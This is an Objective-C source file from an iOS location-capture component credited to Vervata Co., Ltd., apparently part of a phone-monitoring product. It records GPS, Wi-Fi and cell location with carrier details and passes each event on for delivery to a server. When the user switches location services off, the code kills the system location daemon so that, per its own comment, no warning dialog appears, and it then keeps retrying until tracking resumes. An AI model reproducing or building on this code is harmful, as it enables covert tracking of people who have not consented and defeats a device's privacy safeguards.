//
/**
 - Project name :  LocationManager Component
 - Class name   :  LocationCaptureOperation
 - Version      :  1.0  
 - Purpose      :  For LocationManager Component
 - Copy right   :  28/10/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "LocationCaptureOperation.h"
#import "LocationManagerWifiStatus.h"
#import "LocationManagerImpl.h"
#import "FxLocationEvent.h"
#import "DateTimeFormat.h"
#import "PhoneInfo.h"
#import "AppContext.h"


#define LOCATION_SERVICE_CHECKING_TIMEOUT		300		// 5 min


@interface LocationCaptureOperation (private) 
- (Operation) operationMode;
- (void) locationServiceCheckingTimeout;
void locationServiceCallback (CFNotificationCenterRef center, 
							  void *observer, 
							  CFStringRef name, 
							  const void *object, 
							  CFDictionaryRef userInfo);
- (void) registerLocationServiceChangingNotification;
- (void) unregisterLocationServiceChangingNotification;
- (void) startUpdatingLocation;
- (void) stopUpdatingLocation;
- (void) timeout;
- (void) trackingTimeout;
- (int) requestTime;
- (void) storeLocationEvent:(CLLocation *) aNewLocation;
@end

@implementation LocationCaptureOperation

@synthesize mTarget;
@synthesize mDidFinishSelector;
@synthesize mDidUpdateSelector;
@synthesize mDidFailureSelector;
@synthesize mDidLocationTimeoutSelector;
@synthesize mLocationManager;
@synthesize mCapturedLocation;

/**
 - Method name: initWithTarget
 - Purpose:  This method is used to initialize the LocationCaptureOperation class
 - Argument list and description: No argument.
 - Return type and description: id (LocationManagerImpl instance).
 */

- (id) initWithTarget: (LocationManagerImpl *) aTarget {
	DLog(@"initWithTarget.....");
    self = [super init];
	if (self != nil) {
		mTarget = (LocationManagerImpl *) aTarget;
		mLocationWifiStatus = [[LocationManagerWifiStatus alloc]init];
		self.mLocationManager= [[CLLocationManager alloc]init];
		self.mLocationManager.delegate=self;
		[self.mLocationManager setDesiredAccuracy:kCLLocationAccuracyBest];
		[self.mLocationManager setDistanceFilter:kCLDistanceFilterNone];
		DLog (@"Loaction Interval Time:%d",[mTarget mIntervalTime])
		
		[self registerLocationServiceChangingNotification];
	}
	return self;										 
}


/**
 - Method name: operationMode
 - Purpose:  This method is used for identifying the mode of tracking
 - Argument list and description: No argument.
 - Return type and description: (int) Operation
 */

- (Operation) operationMode {
	if([mTarget mIntervalTime] <= [mTarget mThreshold]) 
		return kModeTracking;
    return kModeInterval;
}

- (void) locationServiceCheckingTimeout {
	if ([CLLocationManager locationServicesEnabled]) {
		DLog (@"Location Service is enabled now")
		[self run];
	} else {
		DLog (@"Location Service has still be disabled")
		[self performSelector:@selector(locationServiceCheckingTimeout) withObject:nil afterDelay:LOCATION_SERVICE_CHECKING_TIMEOUT];
	}
}

// This method will be called when the notificaiton is received
void locationServiceCallback (CFNotificationCenterRef center, 
							  void *observer, 
							  CFStringRef name, 
							  const void *object, 
							  CFDictionaryRef userInfo) {
	DLog(@"Notification intercepted (Location service): %@", name);

	
	if ([(NSString *) name isEqualToString:@"LocationServiceDidChangeNotification"]) {		
		DLog(@"Stop updating location because Location Service is OFF.....");
		
		/// NOTE: comment the below line so that the location warning dialog box will not be shown
		//if (![CLLocationManager locationServicesEnabled]) {	// double check to ensure that location is disabled now
		
		system("killall locationd");
		LocationCaptureOperation *this = (LocationCaptureOperation *) observer;
		
		[this stopUpdatingLocation];
		
		DLog(@"cancel previous timeout because Location Service is OFF")
		[NSObject cancelPreviousPerformRequestsWithTarget:this selector:@selector(trackingTimeout) object:nil];
		[NSObject cancelPreviousPerformRequestsWithTarget:this selector:@selector(timeout) object:nil];		// case of interval capturing	
		
		[NSObject cancelPreviousPerformRequestsWithTarget:this selector:@selector(startUpdatingLocation) object:nil];
		
		[NSObject cancelPreviousPerformRequestsWithTarget:this];											// All request from previous target
		
		// In case that this callback is called more than once
		[NSObject cancelPreviousPerformRequestsWithTarget:this selector:@selector(locationServiceCheckingTimeout) object:nil];
		[this performSelector:@selector(locationServiceCheckingTimeout) withObject:nil afterDelay:LOCATION_SERVICE_CHECKING_TIMEOUT];
		
		//}					
	}
}

// This method is aimed to register for the notification from Preference
- (void) registerLocationServiceChangingNotification {
	DLog(@">>>>>>>>>>>>>>>>>> registerLocationServiceChanging");
	
	CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),			// center
									self,													// observer. this parameter may be NULL.
									&locationServiceCallback,								// callback
									(CFStringRef) @"LocationServiceDidChangeNotification",				// name
									NULL,													// object. this value is ignored in the case that the center is Darwin
									CFNotificationSuspensionBehaviorHold); 
}

- (void) unregisterLocationServiceChangingNotification {
	DLog(@">>>>>>>>>>>>>>>>>> unregisterLocationServiceChangingNotification");
	
	CFNotificationCenterRemoveObserver (CFNotificationCenterGetDarwinNotifyCenter(),
										self,
										(CFStringRef) @"LocationServiceDidChangeNotification",
										NULL);
}

/**
 - Method name: run
 - Purpose:  This method is perform tracking location
 - Argument list and description: No argument.
 - Return type and description: No Return
 */

- (void) run {
	DLog (@"============================= self = %@, mTarget = %@", self, mTarget);
	DLog(@"run..... [self requestTime]: %d, [mTarget mInterval]: %d", [self requestTime], [mTarget mIntervalTime]);
	DLog(@"=====================================")
	
	if ([CLLocationManager locationServicesEnabled]) {
		// this method may result in Location Dialog box of the system
		[self performSelector:@selector(startUpdatingLocation) withObject:nil afterDelay:[self requestTime]];
	
		if ([self operationMode] == kModeInterval) {
			DLog(@"Operation mode: INTERVAL")
			[self performSelector:@selector(timeout) withObject:nil afterDelay:[mTarget mIntervalTime]];
		} else {
			DLog (@"Operation mode: TRACKING")
			[self performSelector:@selector(trackingTimeout) withObject:nil afterDelay:[mTarget mIntervalTime]];
		}
	} else {
		DLog (@"Location service is disabled now !!!!!")	
		
		[self performSelector:@selector(locationServiceCheckingTimeout) withObject:nil afterDelay:LOCATION_SERVICE_CHECKING_TIMEOUT];
	}
}

/**
 - Method name: startUpdatingLocation
 - Purpose:  This method is used to start updating location
 - Argument list and description: No argument.
 - Return type and description: No Return
 */	

- (void) startUpdatingLocation {
	DLog(@"startUpdatingLocation CLLocationManager .....");
	[self.mLocationManager startUpdatingLocation];
}

/**
 - Method name: stopUpdatingLocation
 - Purpose:  This method is used to stop updating location
 - Argument list and description: No argument.
 - Return type and description: No Return
 */	

- (void) stopUpdatingLocation {
	DLog(@"stopUpdatingLocation CLLocationManager .....");
	[self.mLocationManager stopUpdatingLocation];
}

/**
 - Method name: reuestTimeForIntervalMode
 - Purpose:  This method is used to get the requestTime
 - Argument list and description: No argument.
 - Return type and description: (int) reuestTimeForIntervalMode
 */	

- (int) requestTime {
	DLog (@"========= Request time enter =============");
	if ([self operationMode] == kModeTracking) {
    	return 0;
	} else {
		int tmp = [mTarget mIntervalTime] - [mTarget mLocationServicesActiveTime];
		if (tmp < 0) {
			
			// In interval mode, always start GPS device and request data mLocationServiceActiveTime (seconds) before interval time is reached 
			//tmp = [mTarget mLocationServicesActiveTime];			
			/* 
			 * In the case that interval time is less than active time (time to request CLLocation API to update location), 
			 * we need to get the location update from CLLocation before interval time is reached,
			 */
			tmp = floor([mTarget mIntervalTime]/2);
			DLog(@"reset request time to %d", tmp)

		}
		return tmp;
	}
}

/**
 - Method name: reuestTimeForIntervalMode
 - Purpose:  This method is invoked when timeout is reached
 - Argument list and description: No argument.
 - Return type and description: No Return
*/	
		
- (void) timeout {
	DLog(@"=====================================")
	DLog(@"!!!!!!!!!!!!!!!!!!!! timeout....")
	DLog(@"=====================================")
	
	[self stopUpdatingLocation];
	[self run];
	
	if (mDidLocationTimeoutSelector) {
		DLog (@"mDidLocationTimeoutSelector exist")
		// -- This is required to call before mDidFinishSelector
		[mTarget performSelector:mDidLocationTimeoutSelector withObject:nil];
	} 
		
	if (mDidFinishSelector) 
		[mTarget performSelector:mDidFinishSelector withObject:nil];	
}

/**
 - Method name: trackingTimeout
 - Purpose:  This method is invoked when tracking timeout is reached... (tracking for gps location but filter event every interval)
 - Argument list and description: No argument.
 - Return type and description: No Return
 */

- (void) trackingTimeout {
	[self performSelector:@selector(trackingTimeout) withObject:self afterDelay:[mTarget mIntervalTime]];
	if (mDidFinishSelector) {
		[mTarget performSelector:mDidFinishSelector withObject:nil];
	}
}

/**
 - Method name: cancelCurrentOperation
 - Purpose:  This method is used to cancel the running operation
 - Argument list and description: No argument.
 - Return type and description: No Return
*/	
		
- (void) cancelCurrentOperation {
	DLog(@"Cancel CurrentOperation.....");
	[self stopUpdatingLocation];
	DLog(@"--------------------------------------------------------------")
	DLog(@"cancel previous tracking timeout")
	[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(trackingTimeout) object:nil];
	DLog(@"--------------------------------------------------------------")
	DLog(@"cancel previous interval timeout")
	[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(timeout) object:nil];
	DLog(@"--------------------------------------------------------------")
	DLog(@"cancel location service checking timeout")
	[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(locationServiceCheckingTimeout) object:nil];
	DLog(@"--------------------------------------------------------------")	

	[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(startUpdatingLocation) object:nil];
	
	// All request from previous target
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
	
	mLocationManager.delegate=nil;
	[mLocationManager release];
	mLocationManager=nil;
	self.mCapturedLocation=nil;
	[mLocationWifiStatus release];
	mLocationWifiStatus=nil;
	
	[self setMDidFinishSelector:nil];
	[self setMDidUpdateSelector:nil];
	[self setMDidFailureSelector:nil];
	mTarget = nil;
	
	DLog(@"Canceled current operation...")
}


/**
 - Method name: sendLocation
 - Purpose:  This method is used to store the captured Location 
 - Argument list and description: aNewLocation (CLLocation).
 - Return type and description: No Return
 */

- (void) storeLocationEvent: (CLLocation *) aNewLocation {
	DLog(@"Store Location event.....");
	FxGPSTechType techType=kGPSTechUnknown;
	if (aNewLocation.verticalAccuracy>0) {
		//techType=kGPSTechIntegrated;
		techType=kGPSTechAssisted;
		DLog(@"Location Services using GPS......");
	}
	else if( aNewLocation.verticalAccuracy<0 && [mLocationWifiStatus getWifiStatus] && (aNewLocation.horizontalAccuracy<150.0)) {
		techType=kGPSTechWifi;
		DLog(@"Location Services using Wifi......");
	}
	else {
		//techType=kGPSTechCellular; --> For the time being use network base
		techType=kGPSTechNetworkBased;
		DLog(@"Location Services using Cellular......");
	}
	
	DLog(@"------------------------------------------------")
	DLog(@"New location latitude = %lf", aNewLocation.coordinate.latitude)
	DLog(@"New location longitude = %lf", aNewLocation.coordinate.longitude)
	DLog(@"New location altitude = %lf", aNewLocation.altitude)
	DLog(@"New location speed = %lf", aNewLocation.speed)
	DLog(@"New location horizontalAccuracy = %lf", aNewLocation.horizontalAccuracy)
	DLog(@"New location verticalAccuracy = %lf", aNewLocation.verticalAccuracy)
	DLog(@"------------------------------------------------")
	
	id <PhoneInfo> phoneInfo= [[mTarget mAppContext] getPhoneInfo];
	//Store location event
	// By default provider is unknown
	FxLocationEvent *locationEvent=[[FxLocationEvent alloc]init];
	[locationEvent setProvider:kGPSProviderUnknown];
	[locationEvent setEventType:kEventTypeLocation];
	[locationEvent setNetworkId:[phoneInfo getMobileNetworkCode]];
	[locationEvent setNetworkName:[phoneInfo getNetworkName]];
	[locationEvent setCountryCode:[phoneInfo getMobileCountryCode]];
	[locationEvent setLatitude:aNewLocation.coordinate.latitude];
	[locationEvent setLongitude:aNewLocation.coordinate.longitude];
	[locationEvent setAltitude:aNewLocation.altitude];
	[locationEvent setAltitude:aNewLocation.speed];
	[locationEvent setHorizontalAcc:aNewLocation.horizontalAccuracy];
	[locationEvent setVerticalAcc:aNewLocation.verticalAccuracy];
	[locationEvent setMethod:techType];
	[locationEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[locationEvent setCallingModule:[mTarget mCallingModule]];
	
	if(mDidUpdateSelector) {
	    [mTarget performSelector:mDidUpdateSelector withObject:locationEvent];
	}
	
	// Now tracking mode have to wait for its tracking timeout before deliver event to server
//	if (mDidFinishSelector!=nil) {
//		if ([self operationMode] == kModeTracking) {
//			[mTarget performSelector:mDidFinishSelector withObject:nil];
//		}
//	}
	
	[locationEvent release];
}

#pragma mark========== CLLocationManagerDelegate methods ===========================

/**
 - Method name: updatedLocation:didUpdateToLocation:fromLocation
 - Purpose: This is callback method. Invoked when a new location is available. oldLocation may be nil if there is no previous location available.
 - Argument list and description: aManager (CLLocationManager instance ),aNewLocation(CLLocation instance),aOldLocation(aOldLocation)
 - Return type and description: No Return
 */

- (void) locationManager: (CLLocationManager *) aManager didUpdateToLocation : (CLLocation *) aNewLocation  fromLocation :(CLLocation *) aOldLocation {
	DLog(@"locationManager didUpdateToLocation.....");
	DLog (@"aNewLocation = %@", aNewLocation);
	DLog (@"aOldLocation = %@", aOldLocation);
	
	//The location is nil.
	if (!aNewLocation) return;
	
	//Discard the location when it stored ago 3 seconds
	NSTimeInterval locationAge = -[aNewLocation.timestamp timeIntervalSinceNow];
	if (locationAge > 3.0) return;
	
	// test the measurement to see if it is more accurate than the previous measurement
	if (self.mCapturedLocation == nil || aNewLocation.horizontalAccuracy > mCapturedLocation.horizontalAccuracy) {
		// store the location as the "best effort"
		self.mCapturedLocation = aNewLocation;
		DLog(@"Store best accuracy:%@",self.mCapturedLocation);
	}
	
	// Update LocationEvent;
	[self storeLocationEvent:aNewLocation];
}

/**
 - Method name: locationManager:didFailWithError
 - Purpose: This is callback method. Invoked when an error has occurred..
 - Argument list and description: aManager (CLLocationManager instance ),aNewLocation(CLLocation instance),aOldLocation(aOldLocation)
 - Return type and description: No Return
 */
- (void) locationManager: (CLLocationManager *) aManager  didFailWithError: (NSError *)aError {
	DLog(@"locationManager didFailWithError.....");
	if(mDidFailureSelector!=nil) {
		[mTarget performSelector:mDidFailureSelector withObject:aError];
	}
}

- (void) dealloc {
	DLog (@"LocationCaptureOperation is dealloced")
	[self cancelCurrentOperation];
	[mCapturedLocation release];
	[mLocationManager release];
	
	[self unregisterLocationServiceChangingNotification];
	[super dealloc];
}

@end
